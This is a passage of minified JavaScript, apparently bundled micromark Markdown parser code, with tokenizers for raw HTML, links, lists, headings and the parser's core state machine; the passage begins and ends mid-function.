R===null||R===60||R===61||R===62||R===96?r(R):R===34||R===39?(e.consume(R),g=R,V):Me(R)?(e.consume(R),D):K(R)}function V(R){return R===g?(e.consume(R),g=null,ae):R===null||Ee(R)?r(R):(e.consume(R),V)}function K(R){return R===null||R===34||R===39||R===47||R===60||R===61||R===62||R===96||Yt(R)?G(R):(e.consume(R),K)}function ae(R){return R===47||R===62||Me(R)?N(R):r(R)}function ie(R){return R===62?(e.consume(R),ee):r(R)}function ee(R){return R===null||Ee(R)?te(R):Me(R)?(e.consume(R),ee):r(R)}function te(R){return R===45&&s===2?(e.consume(R),U):R===60&&s===1?(e.consume(R),Y):R===62&&s===4?(e.consume(R),I):R===63&&s===3?(e.consume(R),k):R===93&&s===5?(e.consume(R),fe):Ee(R)&&(s===6||s===7)?(e.exit("htmlFlowData"),e.check(TB,q,se)(R)):R===null||Ee(R)?(e.exit("htmlFlowData"),se(R)):(e.consume(R),te)}function se(R){return e.check(_B,re,q)(R)}function re(R){return e.enter("lineEnding"),e.consume(R),e.exit("lineEnding"),J}function J(R){return R===null||Ee(R)?se(R):(e.enter("htmlFlowData"),te(R))}function U(R){return R===45?(e.consume(R),k):te(R)}function Y(R){return R===47?(e.consume(R),c="",oe):te(R)}function oe(R){if(R===62){const ue=c.toLowerCase();return Ew.includes(ue)?(e.consume(R),I):te(R)}return Fn(R)&&c.length<8?(e.consume(R),c+=String.fromCharCode(R),oe):te(R)}function fe(R){return R===93?(e.consume(R),k):te(R)}function k(R){return R===62?(e.consume(R),I):R===45&&s===2?(e.consume(R),k):te(R)}function I(R){return R===null||Ee(R)?(e.exit("htmlFlowData"),q(R)):(e.consume(R),I)}function q(R){return e.exit("htmlFlow"),n(R)}}function RB(e,n,r){const i=this;return s;function s(c){return Ee(c)?(e.enter("lineEnding"),e.consume(c),e.exit("lineEnding"),u):r(c)}function u(c){return i.parser.lazy[i.now().line]?r(c):n(c)}}function xB(e,n,r){return i;function i(s){return e.enter("lineEnding"),e.consume(s),e.exit("lineEnding"),e.attempt(vu,n,r)}}const kB={name:"htmlText",tokenize:NB};function NB(e,n,r){const i=this;let s,u,c;return d;function d(k){return e.enter("htmlText"),e.enter("htmlTextData"),e.consume(k),g}function g(k){return k===33?(e.consume(k),f):k===47?(e.consume(k),G):k===63?(e.consume(k),N):Fn(k)?(e.consume(k),K):r(k)}function f(k){return k===45?(e.consume(k),h):k===91?(e.consume(k),u=0,T):Fn(k)?(e.consume(k),O):r(k)}function h(k){return k===45?(e.consume(k),S):r(k)}function b(k){return k===null?r(k):k===45?(e.consume(k),y):Ee(k)?(c=b,Y(k)):(e.consume(k),b)}function y(k){return k===45?(e.consume(k),S):b(k)}function S(k){return k===62?U(k):k===45?y(k):b(k)}function T(k){const I="CDATA[";return k===I.charCodeAt(u++)?(e.consume(k),u===I.length?x:T):r(k)}function x(k){return k===null?r(k):k===93?(e.consume(k),A):Ee(k)?(c=x,Y(k)):(e.consume(k),x)}function A(k){return k===93?(e.consume(k),w):x(k)}function w(k){return k===62?U(k):k===93?(e.consume(k),w):x(k)}function O(k){return k===null||k===62?U(k):Ee(k)?(c=O,Y(k)):(e.consume(k),O)}function N(k){return k===null?r(k):k===63?(e.consume(k),$):Ee(k)?(c=N,Y(k)):(e.consume(k),N)}function $(k){return k===62?U(k):N(k)}function G(k){return Fn(k)?(e.consume(k),D):r(k)}function D(k){return k===45||rn(k)?(e.consume(k),D):V(k)}function V(k){return Ee(k)?(c=V,Y(k)):Me(k)?(e.consume(k),V):U(k)}function K(k){return k===45||rn(k)?(e.consume(k),K):k===47||k===62||Yt(k)?ae(k):r(k)}function ae(k){return k===47?(e.consume(k),U):k===58||k===95||Fn(k)?(e.consume(k),ie):Ee(k)?(c=ae,Y(k)):Me(k)?(e.consume(k),ae):U(k)}function ie(k){return k===45||k===46||k===58||k===95||rn(k)?(e.consume(k),ie):ee(k)}function ee(k){return k===61?(e.consume(k),te):Ee(k)?(c=ee,Y(k)):Me(k)?(e.consume(k),ee):ae(k)}function te(k){return k===null||k===60||k===61||k===62||k===96?r(k):k===34||k===39?(e.consume(k),s=k,se):Ee(k)?(c=te,Y(k)):Me(k)?(e.consume(k),te):(e.consume(k),re)}function se(k){return k===s?(e.consume(k),s=void 0,J):k===null?r(k):Ee(k)?(c=se,Y(k)):(e.consume(k),se)}function re(k){return k===null||k===34||k===39||k===60||k===61||k===96?r(k):k===47||k===62||Yt(k)?ae(k):(e.consume(k),re)}function J(k){return k===47||k===62||Yt(k)?ae(k):r(k)}function U(k){return k===62?(e.consume(k),e.exit("htmlTextData"),e.exit("htmlText"),n):r(k)}function Y(k){return e.exit("htmlTextData"),e.enter("lineEnding"),e.consume(k),e.exit("lineEnding"),oe}function oe(k){return Me(k)?Ye(e,fe,"linePrefix",i.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(k):fe(k)}function fe(k){return e.enter("htmlTextData"),c(k)}}const fg={name:"labelEnd",resolveAll:LB,resolveTo:DB,tokenize:MB},CB={tokenize:FB},IB={tokenize:BB},OB={tokenize:UB};function LB(e){let n=-1;const r=[];for(;++n<e.length;){const i=e[n][1];if(r.push(e[n]),i.type==="labelImage"||i.type==="labelLink"||i.type==="labelEnd"){const s=i.type==="labelImage"?4:2;i.type="data",n+=s}}return e.length!==r.length&&Pn(e,0,e.length,r),e}function DB(e,n){let r=e.length,i=0,s,u,c,d;for(;r--;)if(s=e[r][1],u){if(s.type==="link"||s.type==="labelLink"&&s._inactive)break;e[r][0]==="enter"&&s.type==="labelLink"&&(s._inactive=!0)}else if(c){if(e[r][0]==="enter"&&(s.type==="labelImage"||s.type==="labelLink")&&!s._balanced&&(u=r,s.type!=="labelLink")){i=2;break}}else s.type==="labelEnd"&&(c=r);const g={type:e[u][1].type==="labelLink"?"link":"image",start:{...e[u][1].start},end:{...e[e.length-1][1].end}},f={type:"label",start:{...e[u][1].start},end:{...e[c][1].end}},h={type:"labelText",start:{...e[u+i+2][1].end},end:{...e[c-2][1].start}};return d=[["enter",g,n],["enter",f,n]],d=hn(d,e.slice(u+1,u+i+3)),d=hn(d,[["enter",h,n]]),d=hn(d,pg(n.parser.constructs.insideSpan.null,e.slice(u+i+4,c-3),n)),d=hn(d,[["exit",h,n],e[c-2],e[c-1],["exit",f,n]]),d=hn(d,e.slice(c+1)),d=hn(d,[["exit",g,n]]),Pn(e,u,e.length,d),e}function MB(e,n,r){const i=this;let s=i.events.length,u,c;for(;s--;)if((i.events[s][1].type==="labelImage"||i.events[s][1].type==="labelLink")&&!i.events[s][1]._balanced){u=i.events[s][1];break}return d;function d(y){return u?u._inactive?b(y):(c=i.parser.defined.includes(yi(i.sliceSerialize({start:u.end,end:i.now()}))),e.enter("labelEnd"),e.enter("labelMarker"),e.consume(y),e.exit("labelMarker"),e.exit("labelEnd"),g):r(y)}function g(y){return y===40?e.attempt(CB,h,c?h:b)(y):y===91?e.attempt(IB,h,c?f:b)(y):c?h(y):b(y)}function f(y){return e.attempt(OB,h,b)(y)}function h(y){return n(y)}function b(y){return u._balanced=!0,r(y)}}function FB(e,n,r){return i;function i(b){return e.enter("resource"),e.enter("resourceMarker"),e.consume(b),e.exit("resourceMarker"),s}function s(b){return Yt(b)?Go(e,u)(b):u(b)}function u(b){return b===41?h(b):Tk(e,c,d,"resourceDestination","resourceDestinationLiteral","resourceDestinationLiteralMarker","resourceDestinationRaw","resourceDestinationString",32)(b)}function c(b){return Yt(b)?Go(e,g)(b):h(b)}function d(b){return r(b)}function g(b){return b===34||b===39||b===40?Ak(e,f,r,"resourceTitle","resourceTitleMarker","resourceTitleString")(b):h(b)}function f(b){return Yt(b)?Go(e,h)(b):h(b)}function h(b){return b===41?(e.enter("resourceMarker"),e.consume(b),e.exit("resourceMarker"),e.exit("resource"),n):r(b)}}function BB(e,n,r){const i=this;return s;function s(d){return _k.call(i,e,u,c,"reference","referenceMarker","referenceString")(d)}function u(d){return i.parser.defined.includes(yi(i.sliceSerialize(i.events[i.events.length-1][1]).slice(1,-1)))?n(d):r(d)}function c(d){return r(d)}}function UB(e,n,r){return i;function i(u){return e.enter("reference"),e.enter("referenceMarker"),e.consume(u),e.exit("referenceMarker"),s}function s(u){return u===93?(e.enter("referenceMarker"),e.consume(u),e.exit("referenceMarker"),e.exit("reference"),n):r(u)}}const zB={name:"labelStartImage",resolveAll:fg.resolveAll,tokenize:PB};function PB(e,n,r){const i=this;return s;function s(d){return e.enter("labelImage"),e.enter("labelImageMarker"),e.consume(d),e.exit("labelImageMarker"),u}function u(d){return d===91?(e.enter("labelMarker"),e.consume(d),e.exit("labelMarker"),e.exit("labelImage"),c):r(d)}function c(d){return d===94&&"_hiddenFootnoteSupport"in i.parser.constructs?r(d):n(d)}}const GB={name:"labelStartLink",resolveAll:fg.resolveAll,tokenize:jB};function jB(e,n,r){const i=this;return s;function s(c){return e.enter("labelLink"),e.enter("labelMarker"),e.consume(c),e.exit("labelMarker"),e.exit("labelLink"),u}function u(c){return c===94&&"_hiddenFootnoteSupport"in i.parser.constructs?r(c):n(c)}}const kp={name:"lineEnding",tokenize:$B};function $B(e,n){return r;function r(i){return e.enter("lineEnding"),e.consume(i),e.exit("lineEnding"),Ye(e,n,"linePrefix")}}const Ql={name:"thematicBreak",tokenize:HB};function HB(e,n,r){let i=0,s;return u;function u(f){return e.enter("thematicBreak"),c(f)}function c(f){return s=f,d(f)}function d(f){return f===s?(e.enter("thematicBreakSequence"),g(f)):i>=3&&(f===null||Ee(f))?(e.exit("thematicBreak"),n(f)):r(f)}function g(f){return f===s?(e.consume(f),i++,g):(e.exit("thematicBreakSequence"),Me(f)?Ye(e,d,"whitespace")(f):d(f))}}const Vt={continuation:{tokenize:WB},exit:XB,name:"list",tokenize:YB},VB={partial:!0,tokenize:ZB},qB={partial:!0,tokenize:KB};function YB(e,n,r){const i=this,s=i.events[i.events.length-1];let u=s&&s[1].type==="linePrefix"?s[2].sliceSerialize(s[1],!0).length:0,c=0;return d;function d(S){const T=i.containerState.type||(S===42||S===43||S===45?"listUnordered":"listOrdered");if(T==="listUnordered"?!i.containerState.marker||S===i.containerState.marker:gf(S)){if(i.containerState.type||(i.containerState.type=T,e.enter(T,{_container:!0})),T==="listUnordered")return e.enter("listItemPrefix"),S===42||S===45?e.check(Ql,r,f)(S):f(S);if(!i.interrupt||S===49)return e.enter("listItemPrefix"),e.enter("listItemValue"),g(S)}return r(S)}function g(S){return gf(S)&&++c<10?(e.consume(S),g):(!i.interrupt||c<2)&&(i.containerState.marker?S===i.containerState.marker:S===41||S===46)?(e.exit("listItemValue"),f(S)):r(S)}function f(S){return e.enter("listItemMarker"),e.consume(S),e.exit("listItemMarker"),i.containerState.marker=i.containerState.marker||S,e.check(vu,i.interrupt?r:h,e.attempt(VB,y,b))}function h(S){return i.containerState.initialBlankLine=!0,u++,y(S)}function b(S){return Me(S)?(e.enter("listItemPrefixWhitespace"),e.consume(S),e.exit("listItemPrefixWhitespace"),y):r(S)}function y(S){return i.containerState.size=u+i.sliceSerialize(e.exit("listItemPrefix"),!0).length,n(S)}}function WB(e,n,r){const i=this;return i.containerState._closeFlow=void 0,e.check(vu,s,u);function s(d){return i.containerState.furtherBlankLines=i.containerState.furtherBlankLines||i.containerState.initialBlankLine,Ye(e,n,"listItemIndent",i.containerState.size+1)(d)}function u(d){return i.containerState.furtherBlankLines||!Me(d)?(i.containerState.furtherBlankLines=void 0,i.containerState.initialBlankLine=void 0,c(d)):(i.containerState.furtherBlankLines=void 0,i.containerState.initialBlankLine=void 0,e.attempt(qB,n,c)(d))}function c(d){return i.containerState._closeFlow=!0,i.interrupt=void 0,Ye(e,e.attempt(Vt,n,r),"linePrefix",i.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(d)}}function KB(e,n,r){const i=this;return Ye(e,s,"listItemIndent",i.containerState.size+1);function s(u){const c=i.events[i.events.length-1];return c&&c[1].type==="listItemIndent"&&c[2].sliceSerialize(c[1],!0).length===i.containerState.size?n(u):r(u)}}function XB(e){e.exit(this.containerState.type)}function ZB(e,n,r){const i=this;return Ye(e,s,"listItemPrefixWhitespace",i.parser.constructs.disable.null.includes("codeIndented")?void 0:5);function s(u){const c=i.events[i.events.length-1];return!Me(u)&&c&&c[1].type==="listItemPrefixWhitespace"?n(u):r(u)}}const Sw={name:"setextUnderline",resolveTo:QB,tokenize:JB};function QB(e,n){let r=e.length,i,s,u;for(;r--;)if(e[r][0]==="enter"){if(e[r][1].type==="content"){i=r;break}e[r][1].type==="paragraph"&&(s=r)}else e[r][1].type==="content"&&e.splice(r,1),!u&&e[r][1].type==="definition"&&(u=r);const c={type:"setextHeading",start:{...e[i][1].start},end:{...e[e.length-1][1].end}};return e[s][1].type="setextHeadingText",u?(e.splice(s,0,["enter",c,n]),e.splice(u+1,0,["exit",e[i][1],n]),e[i][1].end={...e[u][1].end}):e[i][1]=c,e.push(["exit",c,n]),e}function JB(e,n,r){const i=this;let s;return u;function u(f){let h=i.events.length,b;for(;h--;)if(i.events[h][1].type!=="lineEnding"&&i.events[h][1].type!=="linePrefix"&&i.events[h][1].type!=="content"){b=i.events[h][1].type==="paragraph";break}return!i.parser.lazy[i.now().line]&&(i.interrupt||b)?(e.enter("setextHeadingLine"),s=f,c(f)):r(f)}function c(f){return e.enter("setextHeadingLineSequence"),d(f)}function d(f){return f===s?(e.consume(f),d):(e.exit("setextHeadingLineSequence"),Me(f)?Ye(e,g,"lineSuffix")(f):g(f))}function g(f){return f===null||Ee(f)?(e.exit("setextHeadingLine"),n(f)):r(f)}}const eU={tokenize:tU};function tU(e){const n=this,r=e.attempt(vu,i,e.attempt(this.parser.constructs.flowInitial,s,Ye(e,e.attempt(this.parser.constructs.flow,s,e.attempt(oB,s)),"linePrefix")));return r;function i(u){if(u===null){e.consume(u);return}return e.enter("lineEndingBlank"),e.consume(u),e.exit("lineEndingBlank"),n.currentConstruct=void 0,r}function s(u){if(u===null){e.consume(u);return}return e.enter("lineEnding"),e.consume(u),e.exit("lineEnding"),n.currentConstruct=void 0,r}}const nU={resolveAll:Rk()},aU=wk("string"),rU=wk("text");function wk(e){return{resolveAll:Rk(e==="text"?iU:void 0),tokenize:n};function n(r){const i=this,s=this.parser.constructs[e],u=r.attempt(s,c,d);return c;function c(h){return f(h)?u(h):d(h)}function d(h){if(h===null){r.consume(h);return}return r.enter("data"),r.consume(h),g}function g(h){return f(h)?(r.exit("data"),u(h)):(r.consume(h),g)}function f(h){if(h===null)return!0;const b=s[h];let y=-1;if(b)for(;++y<b.length;){const S=b[y];if(!S.previous||S.previous.call(i,i.previous))return!0}return!1}}}function Rk(e){return n;function n(r,i){let s=-1,u;for(;++s<=r.length;)u===void 0?r[s]&&r[s][1].type==="data"&&(u=s,s++):(!r[s]||r[s][1].type!=="data")&&(s!==u+2&&(r[u][1].end=r[s-1][1].end,r.splice(u+2,s-u-2),s=u+2),u=void 0);return e?e(r,i):r}}function iU(e,n){let r=0;for(;++r<=e.length;)if((r===e.length||e[r][1].type==="lineEnding")&&e[r-1][1].type==="data"){const i=e[r-1][1],s=n.sliceStream(i);let u=s.length,c=-1,d=0,g;for(;u--;){const f=s[u];if(typeof f=="string"){for(c=f.length;f.charCodeAt(c-1)===32;)d++,c--;if(c)break;c=-1}else if(f===-2)g=!0,d++;else if(f!==-1){u++;break}}if(n._contentTypeTextTrailing&&r===e.length&&(d=0),d){const f={type:r===e.length||g||d<2?"lineSuffix":"hardBreakTrailing",start:{_bufferIndex:u?c:i.start._bufferIndex+c,_index:i.start._index+u,line:i.end.line,column:i.end.column-d,offset:i.end.offset-d},end:{...i.end}};i.end={...f.start},i.start.offset===i.end.offset?Object.assign(i,f):(e.splice(r,0,["enter",f,n],["exit",f,n]),r+=2)}r++}return e}const oU={42:Vt,43:Vt,45:Vt,48:Vt,49:Vt,50:Vt,51:Vt,52:Vt,53:Vt,54:Vt,55:Vt,56:Vt,57:Vt,62:yk},sU={91:dB},lU={[-2]:xp,[-1]:xp,32:xp},uU={35:bB,42:Ql,45:[Sw,Ql],60:vB,61:Sw,95:Ql,96:yw,126:yw},cU={38:Sk,92:Ek},dU={[-5]:kp,[-4]:kp,[-3]:kp,33:zB,38:Sk,42:mf,60:[GF,kB],91:GB,92:[mB,Ek],93:fg,95:mf,96:eB},pU={null:[mf,nU]},fU={null:[42,95]},gU={null:[]},mU=Object.freeze(Object.defineProperty({__proto__:null,attentionMarkers:fU,contentInitial:sU,disable:gU,document:oU,flow:uU,flowInitial:lU,insideSpan:pU,string:cU,text:dU},Symbol.toStringTag,{value:"Module"}));function hU(e,n,r){let i={_bufferIndex:-1,_index:0,line:r&&r.line||1,column:r&&r.column||1,offset:r&&r.offset||0};const s={},u=[];let c=[],d=[];const g={attempt:V(G),check:V(D),consume:O,enter:N,exit:$,interrupt:V(D,{interrupt:!0})},f={code:null,containerState:{},defineSkip:x,events:[],now:T,parser:e,previous:null,sliceSerialize:y,sliceStream:S,write:b};let h=n.tokenize.call(f,g);return n.resolveAll&&u.push(n),f;function b(ee){return c=hn(c,ee),A(),c[c.length-1]!==null?[]:(K(n,0),f.events=pg(u,f.events,f),f.events)}function y(ee,te){return yU(S(ee),te)}function S(ee){return bU(c,ee)}function T(){const{_bufferIndex:ee,_index:te,line:se,column:re,offset:J}=i;return{_bufferIndex:ee,_index:te,line:se,column:re,offset:J}}function x(ee){s[ee.line]=ee.column,ie()}function A(){let ee;for(;i._index<c.length;){const te=c[i._index];if(typeof te=="string")for(ee=i._index,i._bufferIndex<0&&(i._bufferIndex=0);i._index===ee&&i._bufferIndex<te.length;)w(te.charCodeAt(i._bufferIndex));else w(te)}}function w(ee){h=h(ee)}function O(ee){Ee(ee)?(i.line++,i.column=1,i.offset+=ee===-3?2:1,ie()):ee!==-1&&(i.column++,i.offset++),i._bufferIndex<0?i._index++:(i._bufferIndex++,i._bufferIndex===c[i._index].length&&(i._bufferIndex=-1,i._index++)),f.previous=ee}function N(ee,te){const se=te||{};return se.type=ee,se.start=T(),f.events.push(["enter",se,f]),d.push(se),se}function $(ee){const te=d.pop();return te.end=T(),f.events.push(["exit",te,f]),te}function G(ee,te){K(ee,te.from)}function D(ee,te){te.restore()}function V(ee,te){return se;function se(re,J,U){let Y,oe,fe,k;return Array.isArray(re)?q(re):"tokenize"in re?q([re]):I(re);function I(ge){return Ae;function Ae(Pe){const Fe=Pe!==null&&ge[Pe],Ft=Pe!==null&&ge.null,Sn=[...Array.isArray(Fe)?Fe:Fe?[Fe]:[],...Array.isArray(Ft)?Ft:Ft?[Ft]:[]];return q(Sn)(Pe)}}function q(ge){return Y=ge,oe=0,ge.length===0?U:R(ge[oe])}function R(ge){return Ae;function Ae(Pe){return k=ae(),fe=ge,ge.partial||(f.currentConstruct=ge),ge.name&&f.parser.constructs.disable.null.includes(ge.name)?he():ge.tokenize.call(te?Object.assign(Object.create(f),te):f,g,ue,he)(Pe)}}function ue(ge){return ee(fe,k),J}function he(ge){return k.restore(),++oe<Y.length?R(Y[oe]):U}}}function K(ee,te){ee.resolveAll&&!u.includes(ee)&&u.push(ee),ee.resolve&&Pn(f.events,te,f.events.length-te,ee.resolve(f.events.slice(te),f)),ee.resolveTo&&(f.events=ee.resolveTo(f.events,f))}function ae(){const ee=T(),te=f.previous,se=f.currentConstruct,re=f.events.length,J=Array.from(d);return{from:re,restore:U};function U(){i=ee,f.previous=te,f.currentConstruct=se,f.events.length=re,d=J,ie()}}function ie(){i.line in s&&i.column<2&&(i.column=s[i.line],i.offset+=s[i.line]-1)}}function bU(e,n){const r=n.start._index,i=n.start._bufferIndex,s=n.end._index,u=n.end._bufferIndex;let c;if(r===s)c=[e[r].slice(i,u)];else{if(c=e.slice(r,s),i>-1){const d=c[0];typeof d=="string"?c[0]=d.slice(i):c.shift()}u>0&&c.push(e[s].slice(0,u))}return c}function yU(e,n){let r=-1;const i=[];let s;for(;++r<e.length;){const u=e[r];let c;if(typeof u=="string")c=u;else switch(u){case-5:{c="\r";break}case-4:{c=`
 `;break}case-3:{c=`\r
